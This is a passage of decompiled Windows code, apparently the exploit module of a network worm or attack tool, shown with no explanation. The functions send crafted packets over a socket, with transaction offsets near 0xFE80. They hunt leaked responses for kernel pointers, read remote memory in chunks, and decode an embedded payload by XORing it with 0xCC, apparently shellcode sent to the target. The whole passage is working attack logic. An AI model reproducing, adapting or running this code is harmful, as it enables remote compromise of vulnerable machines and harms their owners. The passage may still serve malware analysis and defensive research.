  v28 = v7;
  if ( !v7 )
    return -1;
  v27 = -1;
  v7[15] = rand();
  v31 = 0;
  v29 = 0;
  v33 = 0;
  v38 = 0;
  v36 = 2;
  Src = sub_681F2C1E(a7, 65152, 49159, a2, a3, a4, a5, 2, 1, 255, &v31);
  if ( !Src )
    goto LABEL_74;
  while ( 1 )
  {
    v32 = v31;
    v25 = (7 * v31);
    v9 = CreateHeap(v25);
    v35 = v9;
    if ( !v9 )
      goto LABEL_72;
    v37 = 0;
    do
    {
      v26 = v37;
      if ( v37 == 2 )
      {
        memcpy(&v9[2 * v32], Src, v32);
      }
      else
      {
        v30 = sub_681F2C1E(a7, 65152, 49159, a2, a3, a4, a5, ++*a6, 1, 255, &v32);
        if ( !v30 )
          goto LABEL_71;
        memcpy(&v9[v26 * v32], v30, v32);
        GetAndFreeHeap(&v30);
        v9 = v35;
      }
      ++v37;
    }
    while ( v37 <= 6u );
    v30 = CreateHeap(0x1000u);
    if ( !v30 )
    {
LABEL_71:
      GetAndFreeHeap(&v35);
      goto LABEL_72;
    }
    v26 = 0;
    v32 = SockSendBuffer(s, v9, v25) ? -1 : SockreceivData(&v26, s, 7, v30);
    GetAndFreeHeap(&v30);
    GetAndFreeHeap(&v35);
    if ( v32 )
    {
LABEL_72:
      GetAndFreeHeap(&Src);
      goto LABEL_74;
    }
    GetAndFreeHeap(&Src);
    if ( sub_681F3986(0x10u, s, a2, a3, a4, a5, v36, 1, 0, v28, &v33, &v29, 1) )
      goto LABEL_74;
    if ( v33 )
    {
      if ( v29 > 0x39u )
      {
        v10 = *(v33 + 51);
        v11 = v10 + v33 + 4;
        v12 = v29 + v33 - 49;
        if ( v11 < v12 )
        {
          v13 = *(v33 + 28);
          v37 = v10 + v33 + 4;
          while ( v13 != *(v11 + 42) || *(v33 + 32) != *(v11 + 46) || *(v33 + 30) != *(v11 + 44) || *(v11 + 36) != 1 )
          {
            if ( ++v11 >= v12 )
              goto LABEL_68;
          }
          v14 = Dummy_StackSettup(*(v11 - 16));
          byte_6820F8FC = v14;
          if ( v14 )
          {
            v24 = *(v11 - 16);
            v15 = v11 - 16;
            v16 = v11 - 112;
          }
          else
          {
            v17 = *(v11 - 16);
            if ( v17 < 0x80000000 )
              goto LABEL_68;
            v24 = v17;
            v15 = v11 - 8;
            v16 = v11 - 48;
          }
          if ( v16 > v37 )
            break;
        }
      }
    }
LABEL_68:
    GetAndFreeHeap(&v33);
    if ( ++v38 < 3u )
    {
      Src = sub_681F2C1E(a7, 65152, 49159, a2, a3, a4, a5, ++v36, 1, 255, &v31);
      if ( Src )
        continue;
    }
    goto LABEL_74;
  }
  if ( v14 )
  {
    while ( *v16 != 12
         || *(v16 + 1) != 2
         || *(v16 + 2) <= 0xFE80u
         || !Dummy_StackSettup(*(v16 + 8))
         || !Dummy_StackSettup(*(v16 + 16))
         || !Dummy_StackSettup(*(v16 + 24))
         || !Dummy_StackSettup(*(v16 + 32)) )
    {
      v16 -= 4;
      if ( v16 <= v37 )
        goto LABEL_68;
    }
    qword_6820FAD0 = *(v16 + 8);
    dword_6820FAD8 = *(v16 + 16);
    dword_6820FADC = *(v16 + 20);
  }
  else
  {
    while ( *v16 != 12
         || *(v16 + 1) != 2
         || *(v16 + 2) <= 0xFE80u
         || *(v16 + 8) < 0x80000000
         || *(v16 + 12) < 0x80000000
         || *(v16 + 16) < 0x80000000
         || *(v16 + 20) < 0x80000000 )
    {
      v16 -= 4;
      if ( v16 <= v37 )
        goto LABEL_68;
    }
    LODWORD(qword_6820FAD0) = *(v16 + 8);
    dword_6820FADC = 0;
    qword_6820FAD0 = qword_6820FAD0;
    dword_6820FAD8 = *(v16 + 12);
  }
  v18 = *(v11 + 48);
  v19 = *(v16 + 2);
  v20 = *v11;
  word_6820FB44 = v18;
  *&qword_6820FAE8 = v24 + 65152 - v19;
  dword_6820FB38 = 0;
  v21 = -v20 - (65152 - v19);
  word_6820FB2C = 1;
  dword_6820FB08 = v16 - v37 + 65148;
  word_6820FB28 = v15 - v16 - 4;
  LOWORD(dword_6820FB10) = v15 - v16 - 16;
  LOWORD(dword_6820FB24) = v15 - v16;
  dword_6820FB0C = v15 - v16 + 32;
  LOWORD(dword_6820FB14) = v15 - v16 + 4;
  LOWORD(dword_6820FB18) = v15 - v16 + 56;
  if ( !v20 )
    dword_6820FB38 = 1;
  v22 = 0;
  LOWORD(dword_6820FB1C) = v15 - v16 + 56;
  if ( !byte_6820F8FC )
  {
    word_6820FB20 = dword_6820FB10 - 8;
    if ( v21 == 156 )
    {
      v23 = dword_6820FB18 + 24;
    }
    else
    {
      if ( v21 != 164 )
      {
LABEL_66:
        LOWORD(dword_6820FB1C) = v22;
        goto LABEL_67;
      }
      v23 = dword_6820FB18 + 23;
    }
    v22 = v23;
    goto LABEL_66;
  }
  LOWORD(dword_6820FB14) = dword_6820FB14 + 4;
  dword_6820FB0C += 8;
  LOWORD(dword_6820FB10) = dword_6820FB10 - 16;
  LOWORD(dword_6820FB18) = v15 - v16 + 64;
  word_6820FB28 -= 4;
  word_6820FB20 = dword_6820FB10 - 12;
  if ( v21 == 228 )
  {
    LOWORD(dword_6820FB1C) = dword_6820FB1C + 44;
  }
  else if ( v21 == 252 )
  {
    LOWORD(dword_6820FB1C) = dword_6820FB1C + 43;
  }
  else
  {
    LOWORD(dword_6820FB1C) = 0;
  }
LABEL_67:
  word_6820FB30 = dword_6820FB1C - 2;
  word_6820FB34 = 0;
  if ( !dword_6820FB1C )
    goto LABEL_68;
  v27 = 0;
  word_6820FB34 = dword_6820FB18 - 11;
LABEL_74:
  GetAndFreeHeap(&v33);
  GetAndFreeHeap(&v28);
  return v27;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FAD0: using guessed type __int64 qword_6820FAD0;
// 6820FAD8: using guessed type int dword_6820FAD8;
// 6820FADC: using guessed type int dword_6820FADC;
// 6820FB08: using guessed type int dword_6820FB08;
// 6820FB0C: using guessed type int dword_6820FB0C;
// 6820FB10: using guessed type int dword_6820FB10;
// 6820FB14: using guessed type int dword_6820FB14;
// 6820FB18: using guessed type int dword_6820FB18;
// 6820FB1C: using guessed type int dword_6820FB1C;
// 6820FB20: using guessed type __int16 word_6820FB20;
// 6820FB24: using guessed type int dword_6820FB24;
// 6820FB28: using guessed type __int16 word_6820FB28;
// 6820FB2C: using guessed type __int16 word_6820FB2C;
// 6820FB30: using guessed type __int16 word_6820FB30;
// 6820FB34: using guessed type __int16 word_6820FB34;
// 6820FB38: using guessed type int dword_6820FB38;
// 6820FB44: using guessed type __int16 word_6820FB44;

//----- (681F4820) --------------------------------------------------------
signed int __userpurge sub_681F4820@<eax>(void *a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  void *v10; // edi
  unsigned __int16 v11; // si
  char *v12; // eax
  int v14; // edi
  int v15; // [esp+8h] [ebp-4h]

  v10 = a1;
  v11 = a1 + 15;
  v12 = CreateHeap((a1 + 15));
  v15 = v12;
  if ( !v12 )
    return -1;
  if ( v10 == 4 )
    *(v12 + 15) = a8;
  if ( v10 == 8 )
  {
    *(v12 + 15) = a8;
    *(v12 + 19) = a9;
  }
  v14 = sub_681F3986(v11, s, a3, a4, a5, a6, a7, v10, a10, v12, &v15, &a10, 0);
  GetAndFreeHeap(&v15);
  return v14;
}

//----- (681F489C) --------------------------------------------------------
int __userpurge sub_681F489C@<eax>(_WORD *a1@<eax>, _WORD *a2@<ecx>, SOCKET s, int a4, int a5, int a6, __int16 a7)
{
  _WORD *v7; // ebx
  _WORD *v8; // edi
  char *v10; // esi
  void *v11; // eax
  int v12; // ST40_4
  int v13; // eax
  int v14; // edi
  SIZE_T v15; // [esp+Ch] [ebp-20h]
  int v16; // [esp+10h] [ebp-1Ch]
  int v17; // [esp+14h] [ebp-18h]
  void *v18; // [esp+18h] [ebp-14h]
  void *Src; // [esp+1Ch] [ebp-10h]
  int v20; // [esp+20h] [ebp-Ch]
  char *v21; // [esp+24h] [ebp-8h]
  int v22; // [esp+28h] [ebp-4h]

  v20 = 0;
  v7 = a1;
  v8 = a2;
  Src = sub_681F2C1E(a7, 65152, 49159, a4, a5, *a2, a6, a7, 0, 255, &v20);
  if ( !Src )
    return -1;
  v20 = v20;
  v17 = *v8;
  v15 = (7 * v20);
  v10 = CreateHeap(v15);
  v21 = v10;
  if ( !v10 )
    goto LABEL_16;
  v22 = 0;
  do
  {
    v16 = v22;
    if ( v22 == 2 )
    {
      memcpy(&v10[2 * v20], Src, v20);
    }
    else
    {
      v18 = sub_681F2C1E(a7, 65152, 49159, a4, a5, v17, a6, ++*v7, 0, 255, &v20);
      if ( !v18 )
        goto LABEL_13;
      memcpy(&v10[v16 * v20], v18, v20);
      GetAndFreeHeap(&v18);
      v10 = v21;
    }
    ++v22;
  }
  while ( v22 <= 6u );
  v18 = CreateHeap(0x1000u);
  if ( !v18 )
  {
LABEL_13:
    GetAndFreeHeap(&v21);
    goto LABEL_16;
  }
  v16 = 0;
  v20 = SockSendBuffer(s, v10, v15) ? -1 : SockreceivData(&v16, s, 7, v18);
  GetAndFreeHeap(&v18);
  GetAndFreeHeap(&v21);
  if ( v20 )
  {
LABEL_16:
    GetAndFreeHeap(&Src);
    return -1;
  }
  GetAndFreeHeap(&Src);
  v11 = CreateHeap(0x200u);
  Src = v11;
  if ( !v11 )
    return -1;
  v12 = sub_681F3863(0x200u, s, a4, a5, *v8, a6, a7, a7, 12, v11);
  GetAndFreeHeap(&Src);
  if ( v12 )
    return -1;
  v13 = (dword_6820FB08 + dword_6820FB18 - 512);
  if ( v13 > 0xFE80u || sub_681F4820(2, s, a4, a5, *v8, a6, a7, 0, 0, v13) )
    return -1;
  v18 = 0;
  Src = CreateHeap(0x10u);
  v14 = sub_681F3986(0x10u, s, a4, a5, *v8, a6, 0, 1, 0xFFFF, Src, &v18, &a7, 1);
  GetAndFreeHeap(&Src);
  GetAndFreeHeap(&v18);
  return (v14 == 65538) - 1;
}
// 6820FB08: using guessed type int dword_6820FB08;
// 6820FB18: using guessed type int dword_6820FB18;

//----- (681F4AFE) --------------------------------------------------------
int __stdcall sub_681F4AFE(SOCKET s, int a2, int a3, int a4, int a5, int a6, int a7, void *Src, int a9, int a10, int a11, int a12)
{
  int v12; // ebx
  int v13; // esi
  int v14; // edi

  v12 = a11;
  v13 = a10;
  v14 = a9;
  if ( qword_6820FAF0 != __PAIR__(a11, a10) )
  {
    if ( (dword_6820FB08 + dword_6820FB24 - 512) > 0xFE80u
      || sub_681F4820(a7, s, a2, a3, a4, a5, a6, a10, a11, (dword_6820FB08 + dword_6820FB24 - 512)) )
    {
      return -1;
    }
    LODWORD(qword_6820FAF0) = v13;
    HIDWORD(qword_6820FAF0) = v12;
  }
  return sub_681F3986(v14, s, a2, a3, a4, a5, 0, (v14 - 15), a12, Src, &Src, &a9, 0);
}
// 6820FAF0: using guessed type __int64 qword_6820FAF0;
// 6820FB08: using guessed type int dword_6820FB08;
// 6820FB24: using guessed type int dword_6820FB24;

//----- (681F4BA1) --------------------------------------------------------
int __stdcall sub_681F4BA1(SOCKET s, int a2, int a3, int a4, int a5, int a6)
{
  __int64 v6; // kr00_8
  char *v7; // eax
  int v9; // ST18_4
  int v10; // edi
  char *v11; // [esp+8h] [ebp-8h]
  int v12; // [esp+Ch] [ebp-4h]

  v12 = 4;
  if ( byte_6820F8FC )
    v12 = 8;
  v6 = qword_6820FAD0 + 4;
  v7 = CreateHeap(0x13u);
  v11 = v7;
  if ( !v7 )
    return -1;
  v9 = v12;
  *(v7 + 15) = 4096;
  v10 = sub_681F4AFE(s, a2, a3, a4, a5, a6, v9, v7, 19, v6, SHIDWORD(v6), 0);
  GetAndFreeHeap(&v11);
  return v10;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FAD0: using guessed type __int64 qword_6820FAD0;

//----- (681F4C1C) --------------------------------------------------------
signed int __userpurge sub_681F4C1C@<eax>(int a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, __int64 a9, unsigned __int16 a10, _DWORD *a11, _WORD *a12)
{
  int v12; // edi
  SIZE_T v13; // esi
  char *v14; // eax
  signed int result; // eax
  int v16; // ecx
  SIZE_T v17; // esi
  char *v18; // ecx
  _BYTE *v19; // eax
  int v20; // ST30_4
  char *v21; // eax
  _BYTE *v22; // esi
  int *v23; // esi
  int v24; // ST30_4
  _BYTE *v25; // eax
  int v26; // edi
  _BYTE *v27; // eax
  int v28; // edi
  int v29; // esi
  SIZE_T v30; // eax
  void *v31; // eax
  signed int v32; // edi
  int v33; // [esp+Ch] [ebp-14h]
  int v34; // [esp+10h] [ebp-10h]
  int v35; // [esp+14h] [ebp-Ch]
  int v36; // [esp+18h] [ebp-8h]
  _BYTE *v37; // [esp+1Ch] [ebp-4h]
  int v38; // [esp+4Ch] [ebp+2Ch]
  int v39; // [esp+4Ch] [ebp+2Ch]
  int v40; // [esp+4Ch] [ebp+2Ch]
  int v41; // [esp+4Ch] [ebp+2Ch]
  int v42; // [esp+4Ch] [ebp+2Ch]

  v12 = a1;
  v33 = 0;
  v35 = 0;
  v36 = 4;
  v34 = 0;
  if ( byte_6820F8FC )
  {
    v36 = 8;
    v34 = 4;
  }
  v13 = (v36 + 47);
  v14 = CreateHeap(v13);
  v37 = v14;
  if ( !v14 )
    return -1;
  *(v14 + 15) = a7;
  *(v14 + 19) = a8;
  v16 = v34;
  *&v14[v16 + 19] = 4;
  *&v14[v16 + 34] = 4096;
  *&v14[v16 + 47] = a10;
  v38 = sub_681F4AFE(s, a3, a4, a5, a6, v12, v36, v14, v13, a9, SHIDWORD(a9), dword_6820FB14);
  GetAndFreeHeap(&v37);
  result = -1;
  if ( v38 == -1 )
    return result;
  if ( !dword_6820FB40 )
  {
    v17 = (v36 + 15);
    v18 = CreateHeap(v17);
    v37 = v18;
    if ( !v18 )
      return -1;
    if ( byte_6820F8FC )
      *(v18 + 15) = a9 + word_6820FB20;
    else
      *(v18 + 15) = a9 + word_6820FB20;
    v39 = sub_681F4AFE(s, a3, a4, a5, a6, v12, v36, v18, v17, a9, SHIDWORD(a9), dword_6820FB10);
    GetAndFreeHeap(&v37);
    result = -1;
    if ( v39 == -1 )
      return result;
    dword_6820FB40 = 1;
    v19 = CreateHeap(0x10u);
    v37 = v19;
    if ( !v19 )
      return -1;
    v20 = word_6820FB34;
    v19[15] = 1;
    v40 = sub_681F4AFE(s, a3, a4, a5, a6, v12, 1, v19, 16, a9, SHIDWORD(a9), v20);
    GetAndFreeHeap(&v37);
    if ( v40 == -1 )
      return -1;
  }
  v21 = CreateHeap(0x13u);
  v37 = v21;
  if ( !v21 )
    return -1;
  *(v21 + 17) = v12;
  *(v21 + 15) = 35;
  v41 = sub_681F4AFE(s, a3, a4, a5, a6, v12, 4, v21, 19, a9, SHIDWORD(a9), word_6820FB20);
  GetAndFreeHeap(&v37);
  result = -1;
  if ( v41 == -1 )
    return result;
  if ( dword_6820FB3C )
  {
    v22 = CreateHeap(0x10u);
    v37 = v22;
    if ( v22 )
    {
      if ( sub_681F4AFE(s, a3, a4, a5, a6, v12, 1, v22, 16, a9, SHIDWORD(a9), dword_6820FB1C) == -1 )
      {
        v23 = &v37;
LABEL_21:
        GetAndFreeHeap(v23);
        return -1;
      }
      v24 = word_6820FB2C;
      v22[15] = 2;
      v42 = sub_681F4AFE(s, a3, a4, a5, a6, v12, 1, v22, 16, a9, SHIDWORD(a9), v24);
      GetAndFreeHeap(&v37);
      if ( v42 == -1 )
        return -1;
      goto LABEL_23;
    }
    return -1;
  }
LABEL_23:
  if ( dword_6820FB38 )
  {
    v25 = CreateHeap(0x10u);
    v37 = v25;
    if ( !v25 )
      return -1;
    v26 = sub_681F4AFE(s, a3, a4, a5, a6, v12, 1, v25, 16, a9, SHIDWORD(a9), word_6820FB30);
    GetAndFreeHeap(&v37);
    result = -1;
    if ( v26 == -1 )
      return result;
    dword_6820FB38 = 0;
  }
  dword_6820FB3C = 1;
  v27 = CreateHeap(0xFu);
  v37 = v27;
  if ( !v27 )
    return -1;
  v28 = sub_681F3986(0xFu, s, a3, a4, a5, a6, word_6820FB44, 0, 0, v27, &v35, &v33, 1);
  GetAndFreeHeap(&v37);
  if ( v28 != -2147483643 )
    goto LABEL_38;
  v29 = v35;
  if ( !v35 )
    return -1;
  v30 = *(v35 + 49);
  *a12 = v30;
  if ( v30 >= v33 )
  {
LABEL_38:
    v23 = &v35;
    goto LABEL_21;
  }
  v31 = CreateHeap(v30);
  *a11 = v31;
  if ( v31 )
  {
    memcpy(v31, (*(v29 + 51) + v29 + 4), *a12);
    v32 = 0;
  }
  else
  {
    v32 = -1;
  }
  GetAndFreeHeap(&v35);
  return v32;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FB10: using guessed type int dword_6820FB10;
// 6820FB14: using guessed type int dword_6820FB14;
// 6820FB1C: using guessed type int dword_6820FB1C;
// 6820FB20: using guessed type __int16 word_6820FB20;
// 6820FB2C: using guessed type __int16 word_6820FB2C;
// 6820FB30: using guessed type __int16 word_6820FB30;
// 6820FB34: using guessed type __int16 word_6820FB34;
// 6820FB38: using guessed type int dword_6820FB38;
// 6820FB3C: using guessed type int dword_6820FB3C;
// 6820FB40: using guessed type int dword_6820FB40;
// 6820FB44: using guessed type __int16 word_6820FB44;

//----- (681F4FB3) --------------------------------------------------------
signed int __userpurge sub_681F4FB3@<eax>(int a1@<edx>, int a2@<esi>, __int64 a3)
{
  int v3; // eax
  int v4; // ebx
  __int64 v5; // kr00_8
  signed int result; // eax

  v3 = a2 + a1;
  if ( *(a2 + a1 + 112) != *(a2 + a1 + 120) )
    goto LABEL_8;
  if ( *(v3 + 116) != *(v3 + 124) )
    goto LABEL_8;
  v4 = 0;
  if ( *v3 - a3 > 0x100000 )
    goto LABEL_8;
  while ( 1 )
  {
    a1 += 8;
    if ( ++v4 >= 0x12 )
      break;
    v5 = *(a2 + a1) - a3;
    if ( v5 >= 0 && (*(a2 + a1 + 4) >= (*(a2 + a1) < a3) + HIDWORD(a3) && HIDWORD(v5) != 0 || v5 > 0x100000) )
      goto LABEL_8;
  }
  if ( *(a2 + a1) )
LABEL_8:
    result = 0;
  else
    result = 1;
  return result;
}

//----- (681F501B) --------------------------------------------------------
signed int __userpurge sub_681F501B@<eax>(int a1@<eax>, int a2@<ecx>, __int64 a3)
{
  int v3; // esi
  signed int v4; // ecx
  unsigned int v5; // edi
  int v6; // eax
  signed int v7; // eax
  unsigned int v8; // ecx
  unsigned int v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  v12 = 0;
  v3 = a2;
  v4 = 76;
  if ( byte_6820F8FC )
    v4 = 152;
  v5 = 16 - (a3 & 0xF);
  v10 = a1 - v4;
  if ( v5 >= a1 - v4 )
    return -1;
  while ( 1 )
  {
    v6 = *(v5 + v3);
    if ( v6 != -16843010 )
      break;
    ++v12;
LABEL_16:
    v5 += 4;
    if ( v5 >= v10 )
      return -1;
  }
  if ( v12 < 0x24 )
    goto LABEL_16;
  if ( byte_6820F8FC )
  {
    v7 = sub_681F4FB3(v5, v3, a3);
  }
  else
  {
    v8 = v5;
    if ( *(v5 + v3 + 56) == *(v5 + v3 + 60) )
    {
      v11 = 0;
      while ( (v6 - a3) <= 0x100000 )
      {
        v8 += 4;
        if ( ++v11 >= 0x12 )
        {
          v7 = *(v8 + v3) == 0;
          goto LABEL_15;
        }
        v6 = *(v8 + v3);
      }
    }
    v7 = 0;
  }
LABEL_15:
  if ( !v7 )
    goto LABEL_16;
  qword_6820FAE0 = a3 + v5;
  return 0;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FAE0: using guessed type __int64 qword_6820FAE0;

//----- (681F50E0) --------------------------------------------------------
signed int __stdcall sub_681F50E0(SOCKET a1, int a2, int a3, int a4, int a5, int a6, __int64 a7, unsigned __int16 a8)
{
  signed int v8; // ebx
  unsigned int v9; // esi
  char *v10; // edi
  BOOL *v12; // esi
  __int64 v13; // [esp+Ch] [ebp-20h]
  unsigned int v14; // [esp+18h] [ebp-14h]
  unsigned int v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+20h] [ebp-Ch]
  char *v17; // [esp+24h] [ebp-8h]
  void *Src; // [esp+28h] [ebp-4h]
  int v19; // [esp+54h] [ebp+28h]

  v8 = 1024;
  v9 = 0;
  v15 = a8;
  v10 = CreateHeap(a8);
  v17 = v10;
  if ( v10 )
  {
    Src = 0;
    v16 = 0;
    v19 = a8;
    v13 = a7;
    while ( 1 )
    {
      if ( !v19 )
      {
LABEL_13:
        v12 = &v17;
        goto LABEL_14;
      }
      if ( v8 > v19 )
        v8 = v19;
      if ( sub_681F4C1C(a6, a1, a2, a3, a4, a5, v13, SHIDWORD(v13), *&qword_6820FAE8, v8, &Src, &v16) == -1 )
        break;
      if ( !Src )
        goto LABEL_13;
      v14 = v16 + v9;
      if ( v14 >= v15 )
        break;
      memcpy(&v10[v9], Src, v16);
      GetAndFreeHeap(&Src);
      v9 = v14;
      v13 += v8;
      v19 -= v8;
      if ( !sub_681F501B(v14, v10, a7) )
      {
        GetAndFreeHeap(&v17);
        return 0;
      }
    }
    GetAndFreeHeap(&v17);
    v12 = &Src;
LABEL_14:
    GetAndFreeHeap(v12);
  }
  return -1;
}

//----- (681F51F3) --------------------------------------------------------
signed int __userpurge sub_681F51F3@<eax>(int a1@<edi>, SOCKET a2, int a3, int a4, int a5, int a6)
{
  unsigned __int16 v6; // ax
  signed int result; // eax
  unsigned int v8; // eax
  signed int v9; // eax
  int v10; // [esp+Ch] [ebp-8h]
  _DWORD *v11; // [esp+10h] [ebp-4h]

  v11 = 0;
  v10 = 0;
  v6 = 40;
  if ( byte_6820F8FC )
    v6 = 64;
  if ( sub_681F4C1C(a1, a2, a3, a4, a5, a6, dword_6820FAD8, dword_6820FADC, *&qword_6820FAE8, v6, &v11, &v10) == -1 )
    goto LABEL_4;
  if ( byte_6820F8FC )
  {
    v8 = v11[15];
    LODWORD(qword_6820FB00) = v11[14];
    HIDWORD(qword_6820FB00) = v8;
    if ( !Dummy_StackSettup(__PAIR__(v8, qword_6820FB00)) )
      goto LABEL_4;
  }
  else
  {
    LODWORD(qword_6820FB00) = v11[9];
    qword_6820FB00 = qword_6820FB00;
    if ( qword_6820FB00 < 0x80000000 )
    {
LABEL_4:
      GetAndFreeHeap(&v11);
      return -1;
    }
  }
  GetAndFreeHeap(&v11);
  if ( byte_6820F8FC )
    v9 = sub_681F50E0(a2, a3, a4, a5, a6, a1, qword_6820FB00 - 4096, 0x1000u);
  else
    v9 = sub_681F50E0(a2, a3, a4, a5, a6, a1, qword_6820FB00 - 2816, 0x1000u);
  if ( v9 )
    result = sub_681F50E0(a2, a3, a4, a5, a6, a1, qword_6820FB00 - 6144, 0x2800u);
  else
    result = 0;
  return result;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FAD8: using guessed type int dword_6820FAD8;
// 6820FADC: using guessed type int dword_6820FADC;
// 6820FB00: using guessed type __int64 qword_6820FB00;

//----- (681F5333) --------------------------------------------------------
signed int __userpurge sub_681F5333@<eax>(int a1@<ebx>, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *Src)
{
  _BYTE *v8; // eax
  bool v9; // zf
  __int16 v10; // cx
  int v11; // edx
  int v12; // edi
  char *v13; // esi
  int v14; // ecx
  _BYTE *v15; // eax
  int v16; // ST30_4
  int v17; // ST2C_4
  char *v18; // eax
  _BYTE *v19; // esi
  BOOL *v20; // esi
  signed int result; // eax
  int v22; // ST30_4
  int v23; // ST2C_4
  void *v24; // eax
  int v25; // esi
  void *v26; // eax
  int v27; // edi
  int v28; // edi
  unsigned int v29; // eax
  unsigned int v30; // eax
  __int64 v31; // kr00_8
  char *v32; // eax
  _BYTE *v33; // ecx
  char v34; // dl
  _BYTE *v35; // ecx
  char v36; // dl
  signed int v37; // edi
  int v38; // eax
  int v39; // edx
  int v40; // esi
  signed int v41; // eax
  int v42; // edi
  void *v43; // eax
  __int64 v44; // [esp+Ch] [ebp-20h]
  int v45; // [esp+18h] [ebp-14h]
  int v46; // [esp+20h] [ebp-Ch]
  int v47; // [esp+24h] [ebp-8h]
  int v48; // [esp+28h] [ebp-4h]

  v46 = 0;
  if ( SockProcessSendRecv(s, a3, a4, a5, a1, a6, &v46, Src) == -1 )
    return -1;
  v8 = CreateHeap(0x2Fu);
  Src = v8;
  if ( !v8 )
    return -1;
  v9 = byte_6820F8FC == 0;
  v10 = dword_6820FB14;
  v8[15] = 4;
  v8[31] = 16;
  v8[44] = 1;
  v11 = (v10 + 4);
  if ( !v9 )
    v11 = (v10 + 8);
  v12 = v46;
  v48 = sub_681F4AFE(s, a3, a4, a5, a1, v46, 32, v8, 47, qword_6820FAE8, *(&qword_6820FAE8 + 1), v11);
  GetAndFreeHeap(&Src);
  if ( v48 == -1 )
    return -1;
  if ( !dword_6820FB40 )
  {
    v47 = 4 * (byte_6820F8FC != 0) + 4;
    v45 = (4 * (byte_6820F8FC != 0) + 19);
    v13 = CreateHeap(v45);
    Src = v13;
    if ( !v13 )
      return -1;
    v14 = *(&qword_6820FAE8 + 1);
    if ( byte_6820F8FC )
      *(v13 + 15) = *&qword_6820FAE8 + word_6820FB20;
    else
      *(v13 + 15) = qword_6820FAE8 + word_6820FB20;
    v48 = sub_681F4AFE(s, a3, a4, a5, a1, v12, v47, v13, v45, qword_6820FAE8, v14, dword_6820FB10);
    GetAndFreeHeap(&Src);
    if ( v48 == -1 )
      return -1;
    dword_6820FB40 = 1;
    v15 = CreateHeap(0x10u);
    Src = v15;
    if ( !v15 )
      return -1;
    v16 = word_6820FB34;
    v17 = *(&qword_6820FAE8 + 1);
    v15[15] = 1;
    v48 = sub_681F4AFE(s, a3, a4, a5, a1, v12, 1, v15, 16, qword_6820FAE8, v17, v16);
    GetAndFreeHeap(&Src);
    if ( v48 == -1 )
      return -1;
  }
  v18 = CreateHeap(0x13u);
  Src = v18;
  if ( !v18 )
    return -1;
  *(v18 + 17) = v12;
  *(v18 + 15) = 54;
  v48 = sub_681F4AFE(s, a3, a4, a5, a1, v12, 4, v18, 19, qword_6820FAE8, *(&qword_6820FAE8 + 1), word_6820FB20);
  GetAndFreeHeap(&Src);
  if ( v48 == -1 )
    return -1;
  if ( dword_6820FB3C )
  {
    v19 = CreateHeap(0x10u);
    Src = v19;
    if ( !v19 )
      return -1;
    if ( sub_681F4AFE(s, a3, a4, a5, a1, v12, 1, v19, 16, qword_6820FAE8, *(&qword_6820FAE8 + 1), dword_6820FB1C) == -1 )
    {
      v20 = &Src;
LABEL_20:
      GetAndFreeHeap(v20);
      return -1;
    }
    v22 = word_6820FB2C;
    v23 = *(&qword_6820FAE8 + 1);
    v19[15] = 2;
    v48 = sub_681F4AFE(s, a3, a4, a5, a1, v12, 1, v19, 16, qword_6820FAE8, v23, v22);
    GetAndFreeHeap(&Src);
    if ( v48 == -1 )
      return -1;
  }
  if ( dword_6820FB38 )
  {
    v24 = CreateHeap(0x10u);
    Src = v24;
    if ( !v24 )
      return -1;
    v48 = sub_681F4AFE(s, a3, a4, a5, a1, v12, 1, v24, 16, qword_6820FAE8, *(&qword_6820FAE8 + 1), word_6820FB30);
    GetAndFreeHeap(&Src);
    if ( v48 == -1 )
      return -1;
    dword_6820FB38 = 0;
  }
  v47 = 4 * (byte_6820F8FC != 0) + 4;
  v25 = (4 * (byte_6820F8FC != 0) + 19);
  v26 = CreateHeap(v25);
  Src = v26;
  if ( !v26 )
    return -1;
  v27 = sub_681F4AFE(s, a3, a4, a5, a1, v12, v47, v26, v25, qword_6820FAE8, *(&qword_6820FAE8 + 1), word_6820FB28);
  GetAndFreeHeap(&Src);
  if ( v27 == -1 )
    return -1;
  dword_6820FB3C = 1;
  Src = CreateHeap(0xFu);
  if ( !Src )
    return -1;
  v46 = 0;
  v48 = 0;
  v28 = sub_681F3986(0xFu, s, a3, a4, a5, a1, word_6820FB44, 0, 0, Src, &v48, &v46, 0);
  GetAndFreeHeap(&Src);
  if ( v28 == -1 )
    return -1;
  if ( sub_681F4C1C(
         a7,
         s,
         a3,
         a4,
         a5,
         a1,
         qword_6820FAE8 + word_6820FB28,
         (*&qword_6820FAE8 + word_6820FB28) >> 32,
         *&qword_6820FAE8,
         v47,
         &v48,
         &v46) == -1 )
  {
LABEL_32:
    v20 = &v48;
    goto LABEL_20;
  }
  if ( byte_6820F8FC )
  {
    if ( v46 < 8u )
      goto LABEL_32;
    v29 = *(v48 + 4);
    LODWORD(qword_6820FAF8) = *v48;
    HIDWORD(qword_6820FAF8) = v29;
    if ( !Dummy_StackSettup(__PAIR__(v29, qword_6820FAF8)) )
      goto LABEL_32;
  }
  else
  {
    if ( v46 < 4u )
      goto LABEL_32;
    v30 = *v48;
    qword_6820FAF8 = *v48;
    if ( v30 < 0x80000000 )
      goto LABEL_32;
  }
  GetAndFreeHeap(&v48);
  v31 = qword_6820FAF8 + 256;
  v44 = qword_6820FAF8 + 256;
  v45 = (2 * (byte_6820F8FC == 0) + 3676);
  v32 = CreateHeap(v45);
  v46 = v32;
  if ( !v32 )
    return -1;
  if ( byte_6820F8FC )
  {
    *(v32 + 15) = 488;
    v32[20] = -61;
    Src = &unk_682031A8;
    v33 = v32 + 21;
    v47 = 3655;
    do
    {
      v34 = *Src ^ 0xCC;
      Src = Src + 1;
      *v33++ = v34;
      --v47;
    }
    while ( v47 );
  }
  else
  {
    *(v32 + 15) = 1000;
    *(v32 + 10) = 1218;
    Src = &unk_682031A8;
    v35 = v32 + 23;
    v47 = 3655;
    do
    {
      v36 = *Src ^ 0xCC;
      Src = Src + 1;
      *v35++ = v36;
